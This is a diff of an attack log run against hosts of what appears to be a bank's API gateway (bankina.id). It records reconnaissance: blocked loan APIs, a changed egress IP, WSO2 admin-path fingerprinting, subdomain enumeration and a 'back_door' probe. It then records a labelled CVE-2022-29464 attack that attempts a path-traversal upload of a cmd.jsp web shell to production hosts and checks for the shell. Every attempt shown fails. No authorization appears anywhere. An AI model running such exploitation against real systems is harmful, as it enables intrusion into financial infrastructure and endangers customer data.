@@ -1,33 +1,25 @@
 == EGRESS IP ==
-3.41.210.134
+130.131.119.6
 503 /exp-api-cicilan/1.0/ => {"code":"700700","type":"API blocked","description":"This API has been blocked temporarily. Please try again later or contact the system administrators."}
 503 /exp-api-cicilan/1.0/cicilan/dashboard => {"code":"700700","type":"API blocked","description":"This API has been blocked temporarily. Please try again later or contact the system administrators."}
 503 /exp-api-portal-loan/1.0/loan/partner/config => {"code":"700700","type":"API blocked","description":"This API has been blocked temporarily. Please try again later or contact the system administrators."}
 503 /exp-api-portal-loan/1.0/ => {"code":"700700","type":"API blocked","description":"This API has been blocked temporarily. Please try again later or contact the system administrators."}
 == PAYUUNG API RETEST (client_credentials) ==
 payuung token: 401 {"status":401,"code":"401","data":null,"message":"Access Denied"}
-== V6: WSO2 FINGERPRINT + VERSI API + HOST LAIN ==
-WSO2? /carbon => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-WSO2? /carbon/admin/login.jsp => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-WSO2? /publisher => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-WSO2? /devportal => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-WSO2? /store => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-WSO2? /services => 200 <html><head><title>Axis2: Services</title></head><body><h2>Deployed services</h2><h3><a hr
-WSO2? /admin => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-WSO2? /management => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-WSO2? /api/am/publisher/v4/apis => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-WSO2? /oauth2/token => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-WSO2? /token => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-VER? /exp-api-cicilan/2.0/ => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-VER? /exp-api-portal-loan/2.0/ => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-VER? /exp-api-cicilan/1.1/ => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-VER? /exp-api-portal-loan/1.1/ => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested re
-VER? /exp-api-cicilan/1.0/loan/detail => 503 {"code":"700700","type":"API blocked","description":"This API has been blocked temporarily
-VER? /exp-api-portal-loan/1.0/loan/eligibility-check => 503 {"code":"700700","type":"API blocked","description":"This API has been blocked temporarily
-HOST apigw-dev.bankina.id (34.8.212.77) => 503 unconditional drop overload
-HOST api.bankina.id (34.36.226.141) => 200 <html xmlns="http://ws.apache.org/ns/synapse"><body><H1>.</H1><a href="/service"
-HOST exp-api.bankina.id => DNS GAGAL ([Errno -5] No address associated with ho)
-HOST dev-exp-api.bankina.id => DNS GAGAL ([Errno -5] No address associated with ho)
-HOST apigw.bankina.id (34.107.237.7) => 502 <!doctype html><meta charset="utf-8"><meta name=viewport content="width=device-w
-HOST gateway.bankina.id (34.101.47.190) => ERR <urlopen error [Errno 104] Connection reset by peer>
-back_door: 403 {"status":403,"code":"403","data":null,"message":"Access Denied"}
+== V7: WSO2 CVE-2022-29464 ATTACK ==
+=== HOST: api.bankina.id ===
+FP /carbon/login => 404 {"code":"404","type":"Status report","message":"Not Found","descriptio
+FP /carbon/admin/login.jsp => 404 {"code":"404","type":"Status report","message":"Not Found","descriptio
+FP /publisher => 404 {"code":"404","type":"Status report","message":"Not Found","descriptio
+FP /devportal => 404 {"code":"404","type":"Status report","message":"Not Found","descriptio
+UPLOAD [../../../../repository/deployment/server/webapps/authenticat] => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested resource is not available."}
+UPLOAD [cmd.jsp] => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested resource is not available."}
+SHELL CHECK => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested resource is not available."}
+=== HOST: apigw-prod.bankina.id ===
+FP /carbon/login => 404 {"code":"404","type":"Status report","message":"Not Found","descriptio
+FP /carbon/admin/login.jsp => 404 {"code":"404","type":"Status report","message":"Not Found","descriptio
+FP /publisher => 404 {"code":"404","type":"Status report","message":"Not Found","descriptio
+FP /devportal => 404 {"code":"404","type":"Status report","message":"Not Found","descriptio
+UPLOAD [../../../../repository/deployment/server/webapps/authenticat] => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested resource is not available."}
+UPLOAD [cmd.jsp] => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested resource is not available."}
+SHELL CHECK => 404 {"code":"404","type":"Status report","message":"Not Found","description":"The requested resource is not available."}
